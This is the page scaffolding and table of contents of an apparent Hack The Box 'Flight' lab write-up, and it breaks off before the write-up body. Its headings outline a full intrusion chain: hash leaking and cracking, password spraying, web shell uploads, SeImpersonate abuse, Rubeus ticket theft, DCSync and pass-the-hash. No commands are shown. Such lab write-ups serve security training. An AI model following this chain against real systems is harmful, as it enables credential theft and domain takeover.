
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="ch3ckm8">
      
      
        <link rel="canonical" href="https://ch3ckm8.github.io/personal_blog4/ch3ckm8_HTB_Flight/">
      
      
        <link rel="prev" href="../ch3ckm8_HTB_Escape/">
      
      
        <link rel="next" href="../ch3ckm8_HTB_fluffy/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Flight - Ch3ckm8 Vault</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/interactive_graph.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/obsidian_tags.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/custom.css">
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#intro" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="Ch3ckm8 Vault" class="md-header__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Ch3ckm8 Vault
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Flight
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href=".." class="md-tabs__link">
        
  
  
    
  
  Welcome

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../ch3ckm8_HTB_Active/" class="md-tabs__link">
          
  
  
  HTB Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-tabs__link">
          
  
  
  Other CTF Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../windows/" class="md-tabs__link">
          
  
  
  Tags

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="Ch3ckm8 Vault" class="md-nav__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    Ch3ckm8 Vault
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    HTB Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            HTB Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Active/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Administrator/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Administrator
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Blackfield/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blackfield
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Cascade/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cascade
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_EscapeTwo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    EscapeTwo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Nocturnal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Nocturnal
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Return/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Return
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_TheFrizz/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TheFrizz
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_forest/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forest
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_monteverde/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Monteverde
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_sauna/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Sauna
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Timelapse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Timelapse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_cicada/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cicada
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Escape/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Escape
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Flight
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Flight
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add-target-to-etchosts" class="md-nav__link">
    <span class="md-ellipsis">
      Add target to /etc/hosts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      RPC enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="RPC enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#anonymous-logon" class="md-nav__link">
    <span class="md-ellipsis">
      Anonymous logon
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#anonymous-logon_1" class="md-nav__link">
    <span class="md-ellipsis">
      Anonymous logon
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-app-inspection" class="md-nav__link">
    <span class="md-ellipsis">
      Web app inspection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web app inspection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#banner-grabbing" class="md-nav__link">
    <span class="md-ellipsis">
      Banner grabbing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-app-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Web app enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web app enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Domain enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#subdomain-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Subdomain enumeration
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#virtual-host-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Virtual host enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Virtual host enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#what-is-virtual-host" class="md-nav__link">
    <span class="md-ellipsis">
      What is virtual host?
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#subdomains-vs-vhosts" class="md-nav__link">
    <span class="md-ellipsis">
      Subdomains vs VHosts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#banner-grabbing_1" class="md-nav__link">
    <span class="md-ellipsis">
      Banner grabbing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-the-webapp" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting the WebApp
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploiting the WebApp">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#checking-for-lfi" class="md-nav__link">
    <span class="md-ellipsis">
      Checking for LFI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-for-rfi" class="md-nav__link">
    <span class="md-ellipsis">
      Checking for RFI
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-ntlm-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking NTLM hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-where-we-can-login-with-svc_apache-creds" class="md-nav__link">
    <span class="md-ellipsis">
      Checking where we can login with svc_apache creds
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-svc_apache" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as svc_apache
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-valid-users" class="md-nav__link">
    <span class="md-ellipsis">
      Finding valid users
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#password-spraying" class="md-nav__link">
    <span class="md-ellipsis">
      Password spraying
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-where-we-can-login-with-smoon-creds" class="md-nav__link">
    <span class="md-ellipsis">
      Checking where we can login with S.Moon creds
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-smoon" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as S.Moon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leaking-another-users-ntlm-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Leaking another user’s NTLM hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-ntlm-hash_1" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking NTLM hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-where-we-can-login-with-cbum-creds" class="md-nav__link">
    <span class="md-ellipsis">
      Checking where we can login with c.bum creds
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-cbum" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as C.Bum
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-web-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading web shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shell-as-svc_apache" class="md-nav__link">
    <span class="md-ellipsis">
      Shell as svc_apache
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shell as svc_apache">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#user-privileges-svc_apache" class="md-nav__link">
    <span class="md-ellipsis">
      User privileges (svc_apache)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-membership-of-svc_apache" class="md-nav__link">
    <span class="md-ellipsis">
      Group membership of svc_apache
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-membership-of-cbum" class="md-nav__link">
    <span class="md-ellipsis">
      Group membership of C.Bum
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impersonate-cbum-as-svc_apache" class="md-nav__link">
    <span class="md-ellipsis">
      Impersonate C.Bum as svc_apache
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1-what-runas-does" class="md-nav__link">
    <span class="md-ellipsis">
      🔹 1. What runas does
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-what-impersonation-means-in-windows" class="md-nav__link">
    <span class="md-ellipsis">
      🔹 2. What “impersonation” means in Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-process-level-impersonation" class="md-nav__link">
    <span class="md-ellipsis">
      🔹 3. Process-level impersonation?
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shell-as-cbum" class="md-nav__link">
    <span class="md-ellipsis">
      Shell as C.Bum
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#investigating-the-filesystem" class="md-nav__link">
    <span class="md-ellipsis">
      Investigating the filesystem
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-winpeas" class="md-nav__link">
    <span class="md-ellipsis">
      Using winpeas
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Using winpeas">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listening-ports" class="md-nav__link">
    <span class="md-ellipsis">
      Listening ports
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pid-4-in-windows" class="md-nav__link">
    <span class="md-ellipsis">
      PID 4 in Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#correlating-listening-ports-with-the-iis-server" class="md-nav__link">
    <span class="md-ellipsis">
      Correlating listening ports with the IIS server
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      Port forwarding
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Port forwarding">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-chisel" class="md-nav__link">
    <span class="md-ellipsis">
      Using chisel
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#banner-grabbing_2" class="md-nav__link">
    <span class="md-ellipsis">
      Banner grabbing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#understanding-the-iis-server" class="md-nav__link">
    <span class="md-ellipsis">
      Understanding the IIS server
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Understanding the IIS server">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#webpage-content-directory" class="md-nav__link">
    <span class="md-ellipsis">
      Webpage content directory
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-webshell-on-the-iis-server" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading webshell on the IIS server
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shell-as-iis-apppool" class="md-nav__link">
    <span class="md-ellipsis">
      Shell as IIS APPPOOL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shell as IIS APPPOOL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#what-is-user-iis-apppooldefaultapppool" class="md-nav__link">
    <span class="md-ellipsis">
      What is user iis apppool\defaultapppool ?
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attack-vectors-via-apppool-identity" class="md-nav__link">
    <span class="md-ellipsis">
      Attack Vectors via AppPool Identity
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-users-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Check user’s privileges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#what-is-the-privilege-seimpersonate" class="md-nav__link">
    <span class="md-ellipsis">
      What is the privilege SeImpersonate ?
    </span>
  </a>
  
    <nav class="md-nav" aria-label="What is the privilege SeImpersonate ?">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#so-in-our-case" class="md-nav__link">
    <span class="md-ellipsis">
      So in our case:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#what-impersonating-the-machine-account-locally-means" class="md-nav__link">
    <span class="md-ellipsis">
      What impersonating the MACHINE$ account locally means
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#why-this-works-without-the-machine-account-password" class="md-nav__link">
    <span class="md-ellipsis">
      Why this works without the machine account password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#why-not-impersonate-administrator-directly" class="md-nav__link">
    <span class="md-ellipsis">
      Why not impersonate Administrator directly?
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1-seimpersonateprivilege-vs-actual-tokens" class="md-nav__link">
    <span class="md-ellipsis">
      1️⃣ SeImpersonatePrivilege vs. actual tokens
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-why-machine-works" class="md-nav__link">
    <span class="md-ellipsis">
      2️⃣ Why MACHINE$ works
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-why-administrator-is-harder" class="md-nav__link">
    <span class="md-ellipsis">
      3️⃣ Why Administrator is harder
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-practical-implications" class="md-nav__link">
    <span class="md-ellipsis">
      4️⃣ Practical implications
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#grabbing-machine-accounts-ticket-with-rubeus" class="md-nav__link">
    <span class="md-ellipsis">
      Grabbing machine account’s ticket with Rubeus
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Grabbing machine account’s ticket with Rubeus">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#what-are-machine-accounts-accounts" class="md-nav__link">
    <span class="md-ellipsis">
      What are Machine accounts ($ accounts)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcsync" class="md-nav__link">
    <span class="md-ellipsis">
      DCSync
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-administrator-via-pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as Administrator via pass the hash
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
